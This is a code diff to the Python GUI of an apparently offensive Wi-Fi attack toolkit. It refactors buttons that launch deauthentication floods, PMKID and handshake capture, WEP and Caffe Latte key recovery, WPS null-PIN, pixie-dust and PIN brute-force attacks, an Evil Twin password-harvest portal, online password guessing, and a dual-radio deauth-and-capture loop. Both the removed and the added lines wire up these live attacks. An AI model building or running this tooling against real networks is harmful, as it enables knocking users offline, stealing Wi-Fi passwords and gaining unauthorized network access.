@@ -19,12 +19,16 @@ import threading
 import tkinter as tk
 from pathlib import Path
 from tkinter import filedialog, messagebox, ttk
+from typing import TYPE_CHECKING
 
 from .. import __version__
 from ..scan import AccessPoint
 from . import theme as theme_mod
 from .crack_dialog import CrackDialog
 from .widgets import SignalGraph
+
+if TYPE_CHECKING:
+    from .attack_runner import AttackRunner
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 
@@ -86,7 +90,7 @@ class App:
         self.aps: dict[str, AccessPoint] = {}
         self.selected_bssid: str | None = None
         self._select_capture_watch_stop: threading.Event | None = None
-        self._lock_capture_proc = None  # subprocess.Popen | None
+        self._lock_capture_proc = None  # lock_capture.LockCapture | None
         self._crack_proc_holder: dict = {}  # {"proc": subprocess.Popen} while a crack runs
         self.mon_iface: str | None = None
         self.own_mac: str | None = None
@@ -592,6 +596,21 @@ class App:
         for b in self.attack_buttons:
             b.configure(state=state)
 
+    def _runner(self) -> AttackRunner:
+        """Build an AttackRunner from current App state."""
+        from .attack_runner import AttackRunner
+
+        return AttackRunner(
+            mon_iface=self.mon_iface,
+            own_mac=self.own_mac,
+            capture_dir=self.capture_dir_var.get(),
+            wordlist=self.wordlist_var.get() or None,
+            stop_event=self._stop_event,
+            progress_fn=self._progress_fn,
+            log_fn=self._log,
+            watch_capture_fn=self._watch_capture_size,
+        )
+
     def _run_bg(self, label: str, fn, *args, **kwargs):
         """Run fn(*args, **kwargs) in a background thread; log start/result/
         error, plus a periodic heartbeat while it's running. User feedback
@@ -624,7 +643,7 @@ class App:
                     self._log(f"    WARNING: {self.mon_iface} is in '{mode}' mode, not 'monitor' — this attack will likely fail silently")
                 else:
                     self._log(f"    {self.mon_iface}: monitor mode confirmed")
-            except Exception as exc:
+            except Exception as exc:  # noqa: BLE001 - GUI must survive adapter-query errors
                 self._log(f"    could not check {self.mon_iface} mode: {exc}")
 
         done = threading.Event()
@@ -674,7 +693,7 @@ class App:
 
         try:
             ifaces = detect_interfaces()
-        except Exception as exc:
+        except Exception as exc:  # noqa: BLE001 - GUI must survive adapter-query errors
             self._log(f"could not list adapters: {exc}")
             ifaces = []
         self.adapter_combo["values"] = ifaces
@@ -851,7 +870,7 @@ class App:
                 hopper.hop()
                 try:
                     sniff(iface=self.mon_iface, timeout=hopper.dwell, prn=on_packet, store=False)
-                except Exception as exc:
+                except Exception as exc:  # noqa: BLE001 - transient driver errors during hop must not kill scan
                     # Transient: some drivers (e.g. mt76x0u) briefly drop the
                     # link during a fast 2.4->5GHz channel hop, which makes
                     # scapy's L2 socket setup fail for that one dwell window
@@ -1076,11 +1095,14 @@ class App:
 
     def _lock_channel(self, ap: AccessPoint):
         """Stop hopping and park the adapter on ap's channel. Also
-        launches a real vendored scan-engine capture restricted to this
-        bssid/channel so the capture-size KB readout actually grows from
-        real on-disk data, not just a static existing-file check."""
+        starts a native packet capture restricted to this bssid so the
+        capture-size KB readout actually grows from real on-disk data,
+        not just a static existing-file check."""
         if self.channel_locked and self.locked_bssid == ap.bssid and self._lock_capture_proc is not None:
             return  # already locked to this exact target with a live capture running
+        if ap.channel is None:
+            self._log(f"No channel known for {ap.bssid}; cannot lock")
+            return
         self.channel_locked = True
         self.locked_bssid = ap.bssid
         self.locked_channel = ap.channel
@@ -1095,56 +1117,41 @@ class App:
         self._log(f"Locked to channel {ap.channel} for {ap.ssid or '<hidden>'} ({ap.bssid})")
         if self.mon_iface and "demo" not in self.mon_iface:
             def work():
-                from ..radio import set_channel
+                from ..radio import ensure_channel
 
-                set_channel(self.mon_iface, ap.channel)
+                ensure_channel(self.mon_iface, ap.channel)
                 return f"channel {ap.channel}"
 
             self._run_bg(f"Set channel {ap.channel}", work)
             self._start_lock_capture(ap)
 
     def _start_lock_capture(self, ap: AccessPoint):
-        """Real vendored scan engine, restricted to ap's channel+bssid,
-        writing continuously to disk. Stopped by
-        _unlock_channel/_stop_lock_capture."""
+        """Native AsyncSniffer-backed capture (lock_capture.LockCapture),
+        restricted to ap's bssid on the already-locked channel, writing
+        continuously to disk. Stopped by _unlock_channel/_stop_lock_capture."""
+        assert self.mon_iface is not None
         self._stop_lock_capture()
-        import subprocess
+        import time as _time
 
-        from ..scan_engine import HOPSCAN_BIN
+        from ..lock_capture import LockCapture
         from ..storage import target_capture_dir
 
-        if not HOPSCAN_BIN.exists():
-            self._log(f"lock capture skipped: {HOPSCAN_BIN} not built")
-            return
         out_dir = target_capture_dir(ap.ssid, ap.bssid)
-        prefix = str(out_dir / "lock")
-        cmd = [
-            str(HOPSCAN_BIN), "--output-format", "pcap,csv", "--write-interval", "1",
-            "-w", prefix, "-c", str(ap.channel), "--bssid", ap.bssid, self.mon_iface,
-        ]
+        out_file = out_dir / f"lock_{int(_time.time())}.pcap"
         try:
-            self._lock_capture_proc = subprocess.Popen(
-                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
-            )
+            capture = LockCapture(self.mon_iface, ap.bssid, str(out_file))
+            capture.start()
+            self._lock_capture_proc = capture
         except OSError as exc:
             self._log(f"lock capture failed to start: {exc}")
             self._lock_capture_proc = None
 
     def _stop_lock_capture(self):
-        proc = self._lock_capture_proc
+        capture = self._lock_capture_proc
         self._lock_capture_proc = None
-        if proc is None:
+        if capture is None:
             return
-        import signal as signal_mod
-
-        try:
-            proc.send_signal(signal_mod.SIGINT)
-            proc.wait(timeout=5)
-        except Exception:
-            try:
-                proc.kill()
-            except Exception:
-                pass
+        capture.stop()
 
     def _unlock_channel(self):
         """Resume hopping the full channel range."""
@@ -1162,15 +1169,14 @@ class App:
 
     def _check_channel_lock(self):
         """Auto-unlock if the locked target hasn't been seen for CHANNEL_LOCK_TIMEOUT."""
-        if self.channel_locked and self.locked_bssid:
-            if self.locked_bssid not in self.aps:
-                import time
+        if self.channel_locked and self.locked_bssid and self.locked_bssid not in self.aps:
+            import time
 
-                if self._lock_lost_since is None:
-                    self._lock_lost_since = time.monotonic()
-                elif time.monotonic() - self._lock_lost_since > CHANNEL_LOCK_TIMEOUT:
-                    self._log("Locked target hasn't been seen in 30s; channel lock auto-released")
-                    self._unlock_channel()
+            if self._lock_lost_since is None:
+                self._lock_lost_since = time.monotonic()
+            elif time.monotonic() - self._lock_lost_since > CHANNEL_LOCK_TIMEOUT:
+                self._log("Locked target hasn't been seen in 30s; channel lock auto-released")
+                self._unlock_channel()
         self.root.after(5000, self._check_channel_lock)
 
     def _require_target(self) -> AccessPoint | None:
@@ -1205,7 +1211,7 @@ class App:
         ttk.Label(dlg, textvariable=count_var, font=self.fonts["ui_bold"]).pack(pady=(0, 10))
 
         remaining = [3]
-        after_id = [None]
+        after_id: list[str | None] = [None]
 
         def go():
             if after_id[0]:
@@ -1243,12 +1249,7 @@ class App:
             return
         if not self._confirm_attack("Deauth All Clients", f"Send 64 deauth frames to ALL clients on {ap.bssid} ({ap.ssid or '<hidden>'})."):
             return
-        from ..attacks.deauth import deauth
-
-        self._run_bg(
-            f"Deauth all clients on {ap.bssid}", deauth,
-            self.mon_iface, ap.bssid, client=BROADCAST, count=64, channel=ap.channel,
-        )
+        self._run_bg(f"Deauth all clients on {ap.bssid}", self._runner().deauth_all, ap)
 
     def _attack_deauth_client(self):
         ap = self._require_target()
@@ -1260,12 +1261,7 @@ class App:
             return
         if not self._confirm_attack("Deauth Client", f"Send 64 deauth frames to {client} on {ap.bssid} ({ap.ssid or '<hidden>'})."):
             return
-        from ..attacks.deauth import deauth
-
-        self._run_bg(
-            f"Deauth {client} on {ap.bssid}", deauth,
-            self.mon_iface, ap.bssid, client=client, count=64, channel=ap.channel,
-        )
+        self._run_bg(f"Deauth {client} on {ap.bssid}", self._runner().deauth_client, ap, client)
 
     def _attack_pmkid(self):
         ap = self._require_target()
@@ -1276,22 +1272,7 @@ class App:
             return
         if not self._confirm_attack("PMKID Attack", f"Clientless PMKID capture against {ap.bssid} ({ap.ssid or '<hidden>'})."):
             return
-        from ..attacks.pmkid import capture_pmkid
-        from ..storage import target_capture_dir
-
-        def work():
-            line = capture_pmkid(
-                self.mon_iface, ap.bssid, self.own_mac, channel=ap.channel,
-                stop_event=self._stop_event, progress_fn=self._progress_fn,
-            )
-            if line is None:
-                return "no PMKID captured"
-            out_dir = target_capture_dir(ap.ssid, ap.bssid)
-            out_file = out_dir / f"pmkid_{int(__import__('time').time())}.22000"
-            out_file.write_text(line + "\n")
-            return f"saved to {out_file}"
-
-        self._run_bg(f"PMKID attack on {ap.bssid}", work)
+        self._run_bg(f"PMKID attack on {ap.bssid}", self._runner().pmkid, ap)
 
     def _attack_handshake(self):
         ap = self._require_target()
@@ -1299,64 +1280,27 @@ class App:
             return
         if not self._confirm_attack("Handshake Capture", f"Sniff EAPOL on {ap.bssid} ({ap.ssid or '<hidden>'}) for up to 60s."):
             return
-        from ..attacks.handshake import capture_handshake
-        from ..storage import target_capture_dir
 
         def work():
-            out_dir = target_capture_dir(ap.ssid, ap.bssid)
-            out_file = out_dir / f"handshake_{int(__import__('time').time())}.pcap"
-            watch_stop = threading.Event()
-            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()
-            try:
-                cap = capture_handshake(
-                    self.mon_iface, ap.bssid, channel=ap.channel, timeout=60.0,
-                    outfile=str(out_file), stop_event=self._stop_event, progress_fn=self._progress_fn,
-                )
-            finally:
-                watch_stop.set()
-            if not cap.messages:
-                return "no EAPOL traffic seen"
-            statuses = [cap.status(a, c).value for a, c in cap.messages]
-            return f"{len(cap.messages)} pair(s), statuses={statuses}, saved to {out_file}"
+            return self._runner().handshake(ap)
 
         self._run_bg(f"Handshake capture on {ap.bssid}", work)
 
     def _attack_smart(self):
-        self._omni_style("run_smart")
-
-    def _attack_omni(self):
-        self._omni_style("run")
-
-    def _omni_style(self, method: str):
         ap = self._require_target()
         if not ap:
             return
-        label = "Smart Attack" if method == "run_smart" else "OMNI Attack"
-        if not self._confirm_attack(label, f"Run full {label} chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
+        if not self._confirm_attack("Smart Attack", f"Run full Smart Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
             return
-        wordlist = self.wordlist_var.get() or None
-        capture_dir = self.capture_dir_var.get()
-        self._stop_event.clear()
+        self._run_bg(f"Smart Attack on {ap.bssid}", self._runner().smart, ap)
 
-        def work():
-            from ..crack.john import JohnCracker, JohnUnavailableError
-            from ..omni import OmniOrchestrator
-
-            cracker = None
-            if wordlist:
-                try:
-                    cracker = JohnCracker()
-                except JohnUnavailableError as exc:
-                    self._log(f"warning: {exc} — will batch hashes but not crack")
-            orch = OmniOrchestrator(
-                self.mon_iface, cracker=cracker, capture_dir=capture_dir,
-                stop_event=self._stop_event, progress_fn=self._progress_fn,
-            )
-            report = getattr(orch, method)(ap, wordlist=wordlist)
-            self._log(report.summary())
-            return "cracked" if report.cracked else "no crack"
-
-        self._run_bg(f"{label} on {ap.bssid}", work)
+    def _attack_omni(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack("OMNI Attack", f"Run full OMNI Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
+            return
+        self._run_bg(f"OMNI Attack on {ap.bssid}", self._runner().omni, ap)
 
     def _attack_wep(self):
         ap = self._require_target()
@@ -1373,15 +1317,7 @@ class App:
             key_len = 5
         if not self._confirm_attack("WEP Attack", f"Fake-auth + ARP replay + PTW key recovery against {ap.bssid} ({ap.ssid})."):
             return
-
-        from ..attacks.wep import crack_wep
-
-        def work():
-            key = crack_wep(self.mon_iface, ap.bssid, self.own_mac, ap.ssid, key_len=key_len,
-                            channel=ap.channel, progress_fn=self._progress_fn)
-            return key.hex() if key else "no key recovered"
-
-        self._run_bg(f"WEP attack on {ap.bssid}", work)
+        self._run_bg(f"WEP attack on {ap.bssid}", self._runner().wep, ap, key_len)
 
     def _attack_caffe_latte(self):
         ap = self._require_target()
@@ -1398,14 +1334,7 @@ class App:
             "No AP association needed — replays client ARPs to collect IVs.",
         ):
             return
-        from ..attacks.wep_client import caffe_latte
-
-        def work():
-            key = caffe_latte(self.mon_iface, client_mac, key_len=key_len, channel=ap.channel,
-                              stop_event=self._stop_event, progress_fn=self._progress_fn)
-            return key.hex() if key else "no key recovered"
-
-        self._run_bg(f"Caffe Latte on {client_mac}", work)
+        self._run_bg(f"Caffe Latte on {client_mac}", self._runner().caffe_latte, client_mac, ap, key_len)
 
     def _attack_chopchop(self):
         """DISABLED (2026-08-25): the native ICV-correction math doesn't
@@ -1432,17 +1361,7 @@ class App:
             return
         if not self._confirm_attack("WPS Null-PIN", f"One-shot null-PIN attempt against {ap.bssid} ({ap.ssid})."):
             return
-        from ..attacks.wps import null_pin_attack
-
-        def work():
-            outcome = null_pin_attack(
-                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
-            )
-            if outcome.network_key:
-                return f"{outcome.outcome.value}: key={outcome.network_key}"
-            return outcome.outcome.value
-
-        self._run_bg(f"WPS null-PIN on {ap.bssid}", work)
+        self._run_bg(f"WPS null-PIN on {ap.bssid}", self._runner().wps_null_pin, ap)
 
     def _attack_wps_pixie(self):
         ap = self._require_target()
@@ -1457,22 +1376,7 @@ class App:
             "Requires one M1→M3 exchange to capture crypto material.",
         ):
             return
-        from ..attacks.wps import pixie_attempt
-
-        def work():
-            result = pixie_attempt(
-                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
-            )
-            if result.outcome.name == "SUCCESS":
-                return f"pixie-dust success: key={result.network_key}"
-            # "no vulnerable nonce" is only actually true for FIRST_HALF_WRONG
-            # (the offline pixie math ran and found nothing); TIMEOUT/
-            # AP_SETUP_LOCKED/AUTH_FAILED/ASSOC_FAILED mean it never got that
-            # far — say so plainly instead of mislabeling every failure mode.
-            suffix = f" — {result.detail}" if result.detail else ""
-            return f"pixie-dust failed: {result.outcome.name}{suffix}"
-
-        self._run_bg(f"WPS pixie-dust on {ap.bssid}", work)
+        self._run_bg(f"WPS pixie-dust on {ap.bssid}", self._runner().wps_pixie, ap)
 
     def _attack_wps_bruteforce(self):
         ap = self._require_target()
@@ -1489,23 +1393,7 @@ class App:
         )
         if not warned:
             return
-        self._stop_event.clear()
-        from ..attacks.wps import wps_pin_bruteforce
-
-        def work():
-            result = wps_pin_bruteforce(
-                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel,
-                stop_event=self._stop_event, progress_fn=self._progress_fn,
-            )
-            if result.success:
-                return f"PIN={result.pin} key={result.network_key}"
-            if result.ap_setup_locked:
-                return "AP setup locked"
-            if result.aborted_lockout:
-                return f"aborted after repeated timeouts ({result.attempts} attempts)"
-            return f"no result ({result.attempts} attempts)"
-
-        self._run_bg(f"WPS bruteforce on {ap.bssid}", work)
+        self._run_bg(f"WPS bruteforce on {ap.bssid}", self._runner().wps_bruteforce, ap)
 
     def _stop_attack(self):
         self._stop_event.set()
@@ -1574,6 +1462,8 @@ class App:
         self._queue.put(("capture_size", None))
 
     def _auto_deauth_run(self, ap: AccessPoint, interval: int, stop_event: threading.Event):
+        assert self.mon_iface is not None
+        assert ap.channel is not None
         import time as _time
 
         from ..attacks.deauth import deauth
@@ -1618,7 +1508,7 @@ class App:
                         self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: did NOT go out to {ap.bssid} — see the warning above")
                     else:
                         self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {ap.bssid}")
-                except Exception as exc:
+                except Exception as exc:  # noqa: BLE001 - auto-deauth loop must survive per-round errors
                     self._log(f"auto-deauth round {round_n + 1} failed: {exc}")
                 for _ in range(interval):
                     if stop_event.is_set() or authorized():
@@ -1670,23 +1560,7 @@ class App:
             "Will deauth real clients and serve a password-harvest portal.",
         ):
             return
-        from ..attacks.eviltwin import run_eviltwin
-
-        def work():
-            result = run_eviltwin(
-                iface_ap=iface_ap,
-                iface_mon=self.mon_iface,
-                bssid=ap.bssid,
-                ssid=ap.ssid,
-                channel=ap.channel or 6,
-                stop_event=self._stop_event,
-                progress_fn=self._progress_fn,
-            )
-            if result.success:
-                return f"Evil Twin: password captured → {result.password!r}"
-            return f"Evil Twin: {result.detail}"
-
-        self._run_bg(f"Evil Twin on {ap.bssid}", work)
+        self._run_bg(f"Evil Twin on {ap.bssid}", self._runner().eviltwin, ap, iface_ap)
 
     def _attack_online_guess(self):
         """Live per-password 4-way handshake attempt against the AP itself
@@ -1722,19 +1596,7 @@ class App:
             "~1-3s each) and noisy — every attempt is visible to the AP.",
         ):
             return
-        self._stop_event.clear()
-        from ..attacks.online import online_guess
-
-        def work():
-            result = online_guess(
-                self.mon_iface, ap.bssid, ap.ssid, self.own_mac, wordlist,
-                channel=ap.channel, stop_event=self._stop_event, progress_fn=self._progress_fn,
-            )
-            if result.success:
-                return f"password={result.password!r} after {result.attempts} attempt(s)"
-            return f"{result.detail} ({result.attempts} attempt(s), {result.skipped_invalid} skipped)"
-
-        self._run_bg(f"Online guess on {ap.bssid}", work)
+        self._run_bg(f"Online guess on {ap.bssid}", self._runner().online_guess, ap)
 
     def _attack_pincer(self):
         """Flagship dual-Alfa mode (STATUS.md 'Ideas/undecided', 2026-08-14
@@ -1760,93 +1622,14 @@ class App:
             f"deauths continuously. Both radios go to monitor mode and back when done.",
         ):
             return
-        self._stop_event.clear()
-        self._run_bg(f"PINCER on {ap.bssid}", self._pincer_run, ap, scan_iface, attack_iface, self._stop_event)
+        self._run_bg(
+            f"PINCER on {ap.bssid}",
+            self._runner().pincer,
+            ap, scan_iface, attack_iface, self.randomize_mac_var.get(),
+            self._watch_capture_size,
+        )
 
-    def _pincer_run(self, ap: AccessPoint, scan_iface: str, attack_iface: str, stop_event: threading.Event) -> str:
-        import time as _time
-
-        from ..attacks.deauth import deauth
-        from ..attacks.handshake import HandshakeStatus, capture_handshake
-        from ..radio import set_channel, set_managed_mode, set_monitor_mode
-        from ..storage import target_capture_dir
-
-        from ..radio import get_mode
-
-        randomize = self.randomize_mac_var.get()
-        max_rounds = 12  # dedicated attack radio, not sharing time with scanning -> can afford more
-        interval = 10
-        out_dir = target_capture_dir(ap.ssid, ap.bssid)
-        out_file = out_dir / f"pincer_{int(_time.time())}.pcap"
-
-        self._log(f"PINCER: putting {scan_iface} (scan/listen) into monitor mode (randomize_mac={randomize})")
-        scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize)
-        self._log(f"PINCER: {scan_mon} mode={get_mode(scan_mon)}")
-        self._log(f"PINCER: putting {attack_iface} (attack/deauth) into monitor mode (randomize_mac={randomize})")
-        attack_mon, attack_perm_mac = set_monitor_mode(attack_iface, randomize_mac=randomize)
-        self._log(f"PINCER: {attack_mon} mode={get_mode(attack_mon)}")
-        try:
-            if ap.channel:
-                set_channel(scan_mon, ap.channel)
-                set_channel(attack_mon, ap.channel)
-                self._log(f"PINCER: both radios parked on channel {ap.channel}")
-            else:
-                self._log("PINCER: no channel known for target — radios left on their current channel")
-
-            result: dict = {}
-
-            def listen():
-                result["cap"] = capture_handshake(
-                    scan_mon, ap.bssid, channel=ap.channel,
-                    timeout=interval * max_rounds + 15, outfile=str(out_file),
-                    stop_event=stop_event, progress_fn=self._log,
-                )
-
-            self._log(f"PINCER: {scan_mon} starting EAPOL listener, writing to {out_file}")
-            listener = threading.Thread(target=listen, daemon=True)
-            listener.start()
-            watch_stop = threading.Event()
-            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()
-
-            def authorized() -> bool:
-                cap = result.get("cap")
-                return bool(cap and any(cap.status(a, c) is HandshakeStatus.AUTHORIZED for a, c in cap.messages))
-
-            for round_n in range(max_rounds):
-                if stop_event.is_set():
-                    self._log(f"PINCER: stop requested before round {round_n + 1}/{max_rounds}")
-                    break
-                sent = deauth(attack_mon, ap.bssid, count=1, channel=ap.channel, progress_fn=self._log)
-                if sent == 0:
-                    self._log(
-                        f"PINCER round {round_n + 1}/{max_rounds}: deauth did NOT go out "
-                        f"({attack_mon} -> {ap.bssid}) — see the warning above"
-                    )
-                else:
-                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
-                cap = result.get("cap")
-                if cap is not None:
-                    statuses = {(a, c): cap.status(a, c).value for a, c in cap.messages}
-                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: EAPOL pairs seen so far: {statuses or '(none)'}")
-                for _ in range(interval):
-                    if stop_event.is_set() or authorized():
-                        break
-                    _time.sleep(1)
-                if authorized():
-                    self._log("PINCER: AUTHORIZED handshake detected — stopping deauth rounds")
-                    break
-
-            listener.join(timeout=5)
-            watch_stop.set()
-        finally:
-            self._log("PINCER: restoring both radios to managed mode")
-            set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
-            set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
-            self._log("PINCER: both radios restored")
-
-        if authorized():
-            return f"AUTHORIZED handshake captured -> {out_file}"
-        return "stopped or exhausted rounds, no AUTHORIZED handshake"
+    # ------------------------------------------------------------------
 
     # ------------------------------------------------------------------
     # Captures tab
@@ -1922,14 +1705,13 @@ class App:
 
         try:
             packets = rdpcap(str(path))
-        except Exception as exc:
+        except Exception as exc:  # noqa: BLE001 - capture parse failures are reported, not fatal
             return f"could not parse ({exc})"
         cap = HandshakeCapture()
         pmkid_found = False
         for pkt in packets:
-            if is_eapol(pkt):
-                if extract_pmkid(bytes(pkt)):
-                    pmkid_found = True
+            if is_eapol(pkt) and extract_pmkid(bytes(pkt)):
+                pmkid_found = True
             msg_no = _classify(pkt)
             if msg_no is not None and getattr(pkt, "addr3", None) and getattr(pkt, "addr1", None):
                 ap, client = pkt.addr3, pkt.addr1 if msg_no % 2 == 1 else pkt.addr2
@@ -2230,7 +2012,7 @@ class App:
                 from ..radio import set_managed_mode
 
                 set_managed_mode(self.mon_iface, restore_mac=self._permanent_mac)
-            except Exception:
+            except Exception:  # noqa: BLE001, S110 - shutdown cleanup must be best-effort
                 pass
         self.root.destroy()
 
